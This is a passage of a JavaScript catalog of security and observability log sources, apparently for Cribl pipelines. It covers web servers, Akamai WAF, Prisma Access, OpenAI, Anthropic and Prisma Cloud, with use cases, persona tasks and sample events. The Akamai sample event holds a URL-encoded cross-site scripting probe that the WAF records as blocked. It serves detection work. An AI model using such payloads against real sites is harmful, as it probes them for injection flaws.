            { persona: 'Platform Operator', job: 'Monitor upstream response time p95/p99 and error rates per pool member to detect backend degradation within 60 seconds' },
            { persona: 'Data End User / Analyst', job: 'Track cache hit ratios and bandwidth consumption by virtual host to optimize CDN and origin configurations' },
            { persona: 'Jack of All Trades', job: 'Correlate 5xx error spikes with deployment events and upstream pool health to reduce MTTR by 50%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress health check and static asset request logs (images, CSS, JS) reducing NGINX log volume by 40-60% for SIEM' },
            { persona: 'Data Engineer', job: 'Route 2xx/3xx status logs to Lake for analytics while sending only 4xx/5xx and security-relevant events to SIEM in real time' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Collect NGINX access logs via Cribl Edge file monitor with automatic log rotation handling within 15 minutes' },
            { persona: 'Data Engineer', job: 'Parse custom NGINX log formats and enrich with geo-IP and threat intel lookups before multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor) / Syslog / Container stdout (JSON)',
        sampleEvent: '192.168.1.47 - jperks [06/Jun/2026:14:32:07 -0500] "GET /api/v2/customers/acme/health HTTP/1.1" 200 1534 "https://app.cribl.io/dashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 0.038 0.036 10.0.5.12:8080 200'
      },
      {
        id: 'apache-access',
        name: 'Apache HTTP Server Logs',
        vendor: 'Apache Software Foundation',
        description: 'Apache HTTP Server access and error logs in Combined Log Format (CLF) or custom formats. Captures client requests, response codes, bytes transferred, referrer, user agent, virtual host, mod_security alerts, and SSL/TLS details. Includes error logs with module-level diagnostics.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Brute Force Detection', 'Bot/Scanner Detection', 'Error Rate Monitoring', 'Path Traversal Detection', 'SQL Injection Attempts', 'Bandwidth Abuse', 'SSL Certificate Issues', 'Slow Request Identification'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Development', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for SQL injection, XSS attempts, path traversal, and brute force patterns with OWASP Top 10 coverage' },
            { persona: 'Data End User / Analyst', job: 'Investigate web attack campaigns by tracing malicious request sequences across virtual hosts and correlating with mod_security alerts' },
            { persona: 'Jack of All Trades', job: 'Detect credential stuffing attacks by identifying distributed login failures from rotating source IPs within sliding windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor error rates by virtual host and detect 5xx spike trends exceeding 2x baseline with 90-second alerting latency' },
            { persona: 'Data End User / Analyst', job: 'Track slow request patterns (>500ms) by endpoint path to identify backend bottlenecks before SLA breach' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter static asset requests and health probes from access logs, reducing Apache log volume by 45-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route full access logs to Lake at storage cost while sending security-filtered subset (4xx, 5xx, mod_security) to SIEM' },
            { persona: 'Team Leader', job: 'Quantify Apache log optimization savings by comparing pre/post ingestion volumes across all monitored web servers' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor for Apache Combined Log Format with log rotation support across 25+ servers in under 1 hour' },
            { persona: 'Data Engineer', job: 'Parse custom Apache LogFormat directives and normalize to common web access schema for cross-server correlation' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/apache2/ or /var/log/httpd/) / rsyslog / piped logging',
        sampleEvent: '203.0.113.42 - jperks [06/Jun/2026:14:32:08 -0500] "POST /api/v1/accounts/login HTTP/1.1" 200 1247 "https://app.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" 350ms TLSv1.3 ECDHE-RSA-AES256-GCM-SHA384'
      },
      {
        id: 'iis-access',
        name: 'Microsoft IIS Access Logs',
        vendor: 'Microsoft',
        description: 'Internet Information Services (IIS) W3C Extended Log Format access logs capturing HTTP requests, response codes, server/client IPs, time-taken, bytes sent/received, substatus codes, Win32 error codes, and custom fields. Supports Advanced Logging module for additional headers and response data.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Authentication Failures', 'Slow Response Detection', 'Error Rate Monitoring', 'Bot/Scanner Detection', 'Path Traversal', 'IIS Health Monitoring', 'Application Pool Issues', 'SSL/TLS Audit', 'Bandwidth Analysis'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'Application Development', '.NET Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for authentication failures (401/403 sequences), path traversal attempts, and anomalous substatus codes indicating exploitation' },
            { persona: 'Data End User / Analyst', job: 'Investigate web attacks using IIS substatus and Win32 error codes to differentiate application bugs from active exploitation' },
            { persona: 'Jack of All Trades', job: 'Detect bot/scanner activity by correlating high request rates with missing or anomalous user-agent strings across site bindings' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor time-taken field percentiles per application pool to detect worker process degradation before user-facing impact' },
            { persona: 'Data End User / Analyst', job: 'Track application pool recycles and 503 errors to identify memory leaks and resource exhaustion patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter health probe requests and static content logs from IIS W3C output, reducing SIEM volume by 50-70% per server' },
            { persona: 'Data Engineer', job: 'Route full IIS logs to Lake while sending only security-relevant status codes (4xx/5xx) and high time-taken events to SIEM' },
            { persona: 'Team Leader', job: 'Present per-server IIS log cost reduction metrics with breakdowns by site binding and application pool' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge on Windows IIS servers with W3C log parsing and field extraction within 20 minutes per server' },
            { persona: 'Platform Administrator', job: 'Standardize IIS logging fields across 100+ servers using centralized Edge fleet configuration and field normalization' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on C:\\inetpub\\logs\\) / Windows Event Forwarding / HTTP Logging module / ETW tracing',
        sampleEvent: '2026-06-06 14:32:08 W3SVC1 WEBSERVER01 10.1.2.50 POST /api/v1/accounts/login - 443 jperks@corp.local 203.0.113.42 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://app.example.com/login 200 0 0 1247 2845 350'
      },
      {
        id: 'akamai-waf',
        name: 'Akamai WAF / App & API Protector',
        vendor: 'Akamai Technologies',
        description: 'Web Application Firewall event logs from Akamai App & API Protector (formerly Kona Site Defender). Captures HTTP request details, WAF rule triggers, bot management decisions, rate limiting actions, API security events, client reputation scores, and geographic access controls. Delivered via SIEM Integration (CEF/JSON) or DataStream 2.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Bot Mitigation', 'API Abuse Detection', 'DDoS Layer 7', 'Rate Limiting Enforcement', 'Credential Abuse', 'SQL Injection / XSS', 'Geographic Blocking', 'False Positive Tuning', 'Attack Campaign Correlation'],
        personas: ['Security Engineering', 'SOC', 'Application Security', 'Platform Engineering', 'NOC', 'API Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules covering XSS, SQLi, bot attacks, credential abuse, and API abuse patterns with WAF rule ID correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate attack campaigns by correlating WAF rule triggers with client reputation scores and geographic anomalies' },
            { persona: 'Jack of All Trades', job: 'Identify false positive patterns by comparing WAF alert rates against legitimate traffic baselines per application endpoint' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational WAF events (score <50) and keep only actionable alerts, reducing SIEM volume by 60-75%' },
            { persona: 'Data Engineer', job: 'Route full DataStream 2 feeds to Lake for forensic replay while sending only high-confidence (score 80+) alerts to SIEM' },
            { persona: 'Team Leader', job: 'Report WAF event cost optimization with clear mapping of retained detection value vs reduced ingestion spend' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DDoS Layer 7 rate limiting effectiveness and identify application endpoints under sustained attack within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track bot management challenge pass/fail rates to measure bot mitigation effectiveness across protected properties' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Akamai SIEM Integration API polling or DataStream 2 HTTP delivery into Cribl Stream within 45 minutes' },
            { persona: 'Data Engineer', job: 'Decode base64 attack payloads and enrich WAF events with threat classification before routing to security analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Akamai SIEM Integration API (HTTPS polling) / DataStream 2 (HTTP POST to Cribl) / S3 delivery / Splunk HEC format',
        logFormat: 'JSON (SIEM Integration) or structured key-value (DataStream 2). Includes attack_data object with rule IDs, risk scores, and action taken. Bot events include bot_score, bot_category, and challenge results.',
        avgEPS: '5,000-100,000 EPS depending on site traffic and attack volume',
        sampleEvent: '{"type":"akamai_siem","format":"json","version":"1.0","attackData":{"rules":[{"ruleId":"950002","ruleTag":"XSS","ruleAction":"alert","ruleMessage":"Cross-site Scripting (XSS) Attack","ruleSelector":"ARGS:q"}],"ruleActions":"QWxlcnQ=","clientIP":"203.0.113.42","configId":"12345","policyId":"pol_abc123"},"httpMessage":{"requestId":"1a2b3c4d","start":"2026-06-06T14:32:08Z","method":"GET","host":"www.example.com","path":"/search","query":"q=%3Cscript%3Ealert(1)%3C/script%3E","port":"443","protocol":"HTTP/1.1","status":"403","bytes":"1247","requestHeaders":{"User-Agent":"Mozilla/5.0","X-Forwarded-For":"198.51.100.42"},"responseHeaders":{"Content-Type":"text/html"}},"geo":{"country":"US","city":"Dallas","lat":"32.7767","long":"-96.7970","regionCode":"TX","asn":"16509"},"botData":{"botScore":"85","botCategory":"WEB_SCRAPER","challengePassed":false}}'
      },
    ]
  },
  {
    category: 'SASE / Zero Trust',
    icon: '🌍',
    sources: [
      {
        id: 'prisma-access-traffic',
        name: 'Prisma Access Traffic & Threat Logs',
        vendor: 'Palo Alto Networks',
        description: 'Cloud-delivered firewall traffic, threat prevention, URL filtering, and file blocking logs from Prisma Access (SASE). Captures session-level network activity through the Prisma Access cloud gateways including user identity, application identification, threat verdicts, WildFire analysis results, and data filtering policy actions. Events delivered via Cortex Data Lake or Syslog.',
        status: 'available',
        useCases: ['Remote Worker Threat Detection', 'SaaS Application Monitoring', 'Data Exfiltration Prevention', 'Malware Delivery Blocking', 'URL Category Enforcement', 'Zero Trust Policy Violations', 'Bandwidth Abuse Detection', 'Application Usage Analytics', 'Compliance Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'Cloud Security', 'Compliance', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for remote worker threats including malware downloads, C2 callbacks, and data exfiltration via SaaS apps' },
            { persona: 'Data End User / Analyst', job: 'Investigate zero trust policy violations by correlating user identity, application, and threat verdict across SASE gateways' },
            { persona: 'Jack of All Trades', job: 'Detect compromised remote endpoints by identifying WildFire malicious verdicts paired with unusual application usage patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce Prisma Access traffic log volume by 45-60% by suppressing allowed SaaS health checks and CDN requests while preserving threat events' },
            { persona: 'Data Engineer', job: 'Route threat and URL filtering logs to SIEM in real time while batching full traffic logs to Lake at 10x lower cost' },
            { persona: 'Team Leader', job: 'Demonstrate SASE log optimization ROI with per-gateway volume reduction metrics and maintained detection SLA' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Ensure all remote worker traffic logs are retained for 13 months with tamper-proof storage for regulatory compliance' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing URL category enforcement effectiveness and policy violation trends by user group' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Cortex Data Lake API collection via REST Collector with pagination handling and deliver parsed events within 1 hour' },
            { persona: 'Data Engineer', job: 'Normalize Prisma Access traffic/threat/URL logs into unified SASE schema for cross-product correlation with GlobalProtect events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cortex Data Lake (HTTPS API to Cribl REST Collector) / Syslog (CEF/LEEF via Log Forwarding profile) / HTTPS Log Streaming',
        logFormat: 'CSV (syslog) or JSON (Cortex Data Lake API). Same field structure as PAN-OS TRAFFIC/THREAT/URL logs with additional SASE-specific fields: mobile_user, GlobalProtect_gateway, service_connection, remote_network.',
        avgEPS: '10,000-200,000 EPS depending on user population and gateway count',
        sampleEvent: '<14>Jun 06 14:32:08 prisma-gw-us-east TRAFFIC,end,2049,2026/06/06 14:32:08,jperks@cribl.io,TRAFFIC,end,from-globalprotect,vsys1,trust,untrust,tunnel.1,ethernet1/1,Cortex-Logging,2026/06/06 14:32:08,574326,1,52341,443,0,0,0x400064,tcp,allow,15234,1534,13700,25,2026/06/06 14:32:01,7,office365-enterprise-access,0,730277,0x0,United States,United States,0,15,10,aged-out,0,0,0,0,,prisma-gw-us-east-01,from-policy,,,0,,0,,N/A,0,0,0,0,jperks@cribl.io,globalprotect-gateway-us-east'
      },
      {
        id: 'prisma-access-gp',
        name: 'Prisma Access GlobalProtect / ZTNA Logs',
        vendor: 'Palo Alto Networks',
        description: 'GlobalProtect gateway and portal authentication logs, ZTNA connection events, HIP (Host Information Profile) check results, and tunnel lifecycle events from Prisma Access. Captures remote user VPN connections, device posture assessments, certificate validations, and explicit proxy connections for zero trust network access.',
        status: 'available',
        useCases: ['VPN Authentication Monitoring', 'Device Posture Compliance', 'ZTNA Policy Enforcement', 'Connection Failure Troubleshooting', 'Split-Tunnel Visibility', 'Certificate Expiry Detection', 'User Mobility Tracking', 'Gateway Health Monitoring', 'Concurrent Session Abuse'],
        personas: ['Security Engineering', 'NOC', 'Identity Team', 'Platform Engineering', 'SOC', 'Help Desk'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor GlobalProtect gateway health and tunnel establishment success rates to maintain 99.9% VPN availability SLA' },
            { persona: 'Data End User / Analyst', job: 'Troubleshoot connection failures by correlating HIP check results, certificate status, and client OS versions within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Track user mobility patterns across gateways to identify split-tunnel misconfigurations and suboptimal routing' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for concurrent VPN sessions from impossible locations, failed HIP posture checks, and certificate anomalies' },
            { persona: 'Data End User / Analyst', job: 'Identify compromised credentials by detecting VPN authentication from new geolocations not matching user travel patterns' },
            { persona: 'Jack of All Trades', job: 'Detect device posture compliance drift by correlating HIP check failures with endpoint security tool status' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete VPN authentication audit trail with device posture evidence for SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Report on ZTNA policy enforcement gaps showing users bypassing posture requirements via exception policies' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest GlobalProtect authentication and HIP logs via Cortex Data Lake API with user identity enrichment within 45 minutes' },
            { persona: 'Data Engineer', job: 'Correlate GlobalProtect connection events with Prisma Access traffic logs to build complete remote user session timelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cortex Data Lake (HTTPS API) / Syslog (GlobalProtect system logs) / HTTPS Log Streaming',
        logFormat: 'Structured syslog or JSON. Key fields: virtual_system, event_type (gp-auth, gp-connect, gp-disconnect, hip-match), user, source_ip, gateway, portal, hip_match_type, client_os, client_version, tunnel_type.',
        avgEPS: '1,000-20,000 EPS depending on remote user population',
        sampleEvent: '{"log_type":"globalprotect","event_type":"gp-auth-success","receive_time":"2026-06-06T14:32:08.000Z","serial":"prisma-gw-us-east","user":"jperks@cribl.io","source_ip":"203.0.113.42","gateway":"prisma-gw-us-east-01","portal":"portal.prismaaccess.com","client_os":"Windows 10.0.26200","client_version":"6.3.1","tunnel_type":"IPSec","auth_method":"SAML-Okta","hip_match":"corporate-managed-device","device_name":"LAPTOP-JP01","connection_duration":0,"bytes_sent":0,"bytes_received":0}'
      }
    ]
  },
  {
    category: 'AI / LLM',
    icon: '🤖',
    sources: [
      {
        id: 'openai-usage',
        name: 'OpenAI API Usage Logs',
        vendor: 'OpenAI',
        description: 'API usage and audit logs from OpenAI platform capturing model invocations, token consumption, API key usage, rate limit events, content filter triggers, fine-tuning jobs, file uploads, and assistant/thread interactions. Delivered via the OpenAI Usage API, Organization Audit Logs, and real-time usage dashboard exports.',
        status: 'available',
        useCases: ['Prompt Injection Detection', 'Data Leakage via Prompts', 'Token Cost Optimization', 'Rate Limit Monitoring', 'Content Policy Violations', 'Shadow AI Usage', 'Model Performance Tracking', 'API Key Abuse', 'Fine-Tuning Governance', 'Usage Allocation by Team'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'Data Protection', 'FinOps', 'AI/ML Team', 'Compliance'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce OpenAI API log volume by 50-65% by aggregating repetitive health-check and ping requests into hourly summaries' },
            { persona: 'Data Engineer', job: 'Route token usage metrics to FinOps dashboards while sending only content filter triggers and anomalous requests to SIEM' },
            { persona: 'Team Leader', job: 'Produce monthly cost-per-model reports showing token spend by team and identify optimization targets saving 20%+ on API costs' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for prompt injection patterns, API key abuse, and shadow AI usage from unauthorized IP ranges' },
            { persona: 'Data End User / Analyst', job: 'Investigate content filter triggers by correlating user identity, model, and prompt metadata to identify policy violations within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect API key compromise by identifying usage spikes exceeding 3x baseline or requests from new geographic locations' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all AI model invocations with user attribution for 12+ months to satisfy AI governance requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate AI usage compliance reports showing content policy violations and data classification breaches by department within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor API latency p95/p99 and rate limit events per model to detect capacity degradation within 2-minute windows' },
            { persona: 'Jack of All Trades', job: 'Track model usage distribution and token consumption trends to forecast budget impact of new AI feature rollouts' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'OpenAI Organization Audit Log API (Cribl REST Collector) / Usage API polling / Webhook integration / API gateway proxy logs (capturing request/response metadata)',
        logFormat: 'JSON. Key fields: id, type (api_request, content_filter, rate_limit, fine_tune), timestamp, organization_id, project_id, api_key_id, model, endpoint, tokens_input, tokens_output, tokens_total, user, ip_address, status_code, content_filter_results, latency_ms.',
        avgEPS: '100-50,000 EPS depending on API call volume and logging granularity',
        sampleEvent: '{"id":"req-abc123","type":"api_request","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-xyz789","project_id":"proj-456","api_key_id":"sk-...abc","api_key_name":"production-backend","model":"gpt-4o","endpoint":"/v1/chat/completions","tokens_input":1250,"tokens_output":847,"tokens_total":2097,"user":"svc-chatbot@cribl.io","ip_address":"10.1.2.50","status_code":200,"latency_ms":2340,"content_filter_results":{"sexual":false,"violence":false,"self_harm":false,"hate":false},"cost_usd":0.0157}'
      },
      {
        id: 'openai-compliance',
        name: 'OpenAI Compliance / Trust Logs',
        vendor: 'OpenAI',
        description: 'Compliance and governance logs from OpenAI capturing data retention events, content moderation decisions, PII detection in prompts/completions, model abuse indicators, safety system activations, organization policy enforcement, and data processing records for regulatory compliance (SOC2, GDPR). Includes ChatGPT Enterprise and API compliance events.',
        status: 'available',
        useCases: ['PII Leakage Detection', 'Regulatory Compliance (GDPR/SOC2)', 'Content Policy Enforcement', 'Data Retention Governance', 'Model Abuse Detection', 'Conversation Logging for Audit', 'Sensitive Topic Monitoring', 'Employee AI Usage Compliance', 'Third-Party Data Exposure', 'Prompt/Completion Archival'],
        personas: ['Compliance', 'Data Protection', 'Security Engineering', 'SOC', 'Legal', 'Privacy Team', 'AI Governance'],
        jobsToBeDone: [
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Enforce 100% PII detection coverage across all AI conversations with automated redaction before storage in compliance archive' },
            { persona: 'Data End User / Analyst', job: 'Generate GDPR/SOC2 compliance reports showing data retention actions, PII exposure incidents, and remediation timelines within 30 minutes' },
            { persona: 'Team Leader', job: 'Demonstrate AI governance maturity to auditors with complete policy violation tracking and resolution metrics per quarter' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for PII leakage in prompts, sensitive topic policy violations, and unauthorized data classification exposure' },
            { persona: 'Data End User / Analyst', job: 'Investigate model abuse indicators by tracing conversation histories with safety system activations to identify insider threats' },
            { persona: 'Jack of All Trades', job: 'Detect third-party data exposure by correlating prompt content classification with organizational data handling policies' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume compliance heartbeat events and retain only policy-relevant records, reducing storage by 40-55%' },
            { persona: 'Data Engineer', job: 'Route PII detection alerts and policy violations to SIEM in real time while batching routine compliance metadata to Lake for long-term audit' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure REST Collector polling for OpenAI Compliance API with pagination handling and deduplication within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize OpenAI compliance events across ChatGPT Enterprise and API channels into unified AI governance schema for cross-platform reporting' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3', 'CrowdStrike NG SIEM'],
        collectionMethod: 'OpenAI Compliance API (Cribl REST Collector) / ChatGPT Enterprise Admin Audit Export / Data Export API / DLP integration proxy',
        logFormat: 'JSON. Key fields: event_id, event_type (conversation, moderation, retention, policy_violation), timestamp, user_id, user_email, organization_id, model, conversation_id, pii_detected, pii_types[], content_filter_triggered, policy_name, retention_action, data_classification.',
        avgEPS: '50-10,000 EPS depending on user population and compliance logging level',
        sampleEvent: '{"event_id":"evt-comp-12345","event_type":"policy_violation","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-xyz789","user_id":"user-abc","user_email":"jperks@cribl.io","model":"gpt-4o","conversation_id":"conv-456","policy_name":"No-PII-in-Prompts","violation_details":{"pii_detected":true,"pii_types":["credit_card","ssn"],"prompt_snippet":"...customer SSN is 123-45-...","action_taken":"blocked","severity":"high"},"data_classification":"confidential","retention_status":"redacted"}'
      },
      {
        id: 'anthropic-compliance',
        name: 'Anthropic Usage & Compliance Logs',
        vendor: 'Anthropic',
        description: 'API usage, safety, and compliance logs from the Anthropic platform (Claude API). Captures model invocations, token consumption, content moderation triggers, safety classifier activations, usage limits, API key lifecycle events, and compliance-relevant metadata for audit trails. Supports enterprise governance requirements including data handling verification and responsible AI monitoring.',
        status: 'available',
        useCases: ['Prompt Injection Detection', 'Sensitive Data in Prompts', 'Token Cost Optimization', 'Safety Classifier Monitoring', 'API Key Governance', 'Rate Limit Tracking', 'Shadow AI Detection', 'Responsible AI Compliance', 'Usage Allocation by Workspace', 'Content Policy Enforcement'],
        personas: ['Security Engineering', 'Compliance', 'Platform Engineering', 'Data Protection', 'FinOps', 'AI/ML Team', 'SOC'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate Claude API request logs by workspace and model into hourly cost summaries, reducing raw log volume by 55-70%' },
            { persona: 'Data Engineer', job: 'Route safety triggers and anomalous usage to SIEM while sending token-level billing metrics to FinOps platforms at lower cost' },
            { persona: 'Team Leader', job: 'Deliver weekly cost-per-workspace reports with model-level breakdowns identifying teams exceeding allocated AI budgets by 15%+' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain immutable audit trail of all Claude API invocations with workspace attribution for responsible AI governance requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate safety classifier activation reports showing frequency, severity, and resolution status by use case for quarterly AI ethics review' },
            { persona: 'Jack of All Trades', job: 'Detect shadow AI usage by identifying API calls from unregistered IP addresses or unauthorized service accounts within 5 minutes' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for prompt injection attempts, sensitive data exfiltration via completions, and API key abuse patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate safety trigger events by correlating request metadata with user identity and workspace context to assess intent' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Claude API latency percentiles and rate limit utilization per workspace to prevent service degradation before user impact' },
            { persona: 'Data End User / Analyst', job: 'Track model adoption trends and stop_reason distributions to identify integration issues and optimize prompt engineering efforts' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Anthropic Admin API (Cribl REST Collector) / Usage API polling / Webhook notifications / API gateway proxy logs',
        logFormat: 'JSON. Key fields: id, type (api_request, safety_trigger, rate_limit, compliance_event), timestamp, organization_id, workspace_id, api_key_id, model, input_tokens, output_tokens, stop_reason, user_id, ip_address, safety_categories, latency_ms, cost_usd.',
        avgEPS: '50-20,000 EPS depending on API volume and logging verbosity',
        sampleEvent: '{"id":"req-ant-789","type":"api_request","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-cribl-123","workspace_id":"ws-prod","api_key_id":"sk-ant-...xyz","api_key_name":"cse-automation","model":"claude-sonnet-4-6-20250514","input_tokens":2100,"output_tokens":1450,"stop_reason":"end_turn","user_id":"svc-assistant@cribl.io","ip_address":"10.1.2.50","status_code":200,"latency_ms":3200,"safety_triggered":false,"cost_usd":0.0234,"metadata":{"use_case":"customer-facing-bot","department":"customer-success"}}'
      }
    ]
  },
  {
    category: 'Cloud',
    icon: '☁️',
    sources: [
      {
        id: 'prisma-cloud-cspm',
        name: 'Prisma Cloud CSPM / CIEM Alerts',
        vendor: 'Palo Alto Networks',
        description: 'Cloud Security Posture Management (CSPM) and Cloud Infrastructure Entitlement Management (CIEM) alerts from Prisma Cloud. Captures misconfiguration findings, compliance violations, IAM excessive permissions, network exposure risks, and anomalous cloud API activity across AWS, Azure, and GCP. Events include alert severity, policy details, resource metadata, and remediation guidance.',
        status: 'available',
        useCases: ['Cloud Misconfiguration Detection', 'Compliance Monitoring (CIS/SOC2/PCI)', 'Excessive IAM Permissions', 'Public Exposure Detection', 'Anomalous API Activity', 'Drift Detection', 'Multi-Cloud Governance', 'Attack Path Analysis', 'Identity Threat Detection'],
        personas: ['Cloud Security', 'Security Engineering', 'Compliance', 'DevOps', 'Platform Engineering', 'SOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for publicly exposed resources, excessive IAM permissions, and configuration drift from approved baselines' },
            { persona: 'Data End User / Analyst', job: 'Investigate attack path analysis alerts by correlating CSPM misconfigurations with network exposure and IAM entitlement chains' },
            { persona: 'Jack of All Trades', job: 'Detect anomalous cloud API activity patterns indicating credential compromise across AWS, Azure, and GCP within 10 minutes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain continuous CIS/SOC2/PCI compliance posture scoring with automated drift alerts when benchmarks drop below 95%' },
            { persona: 'Data End User / Analyst', job: 'Generate multi-cloud compliance reports by framework (CIS, PCI, SOC2) showing violation trends and remediation velocity per account' },
            { persona: 'Team Leader', job: 'Present executive compliance dashboards showing posture improvement over 90-day windows with clear risk reduction metrics' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate recurring CSPM alerts for known-accepted risks and suppress informational findings, reducing SIEM alert volume by 45-60%' },
            { persona: 'Data Engineer', job: 'Route critical/high severity CSPM alerts to SIEM in real time while batching medium/low findings to Lake for trend analysis' }
          ]},
          { category: 'Operational Visibility', jobs: [
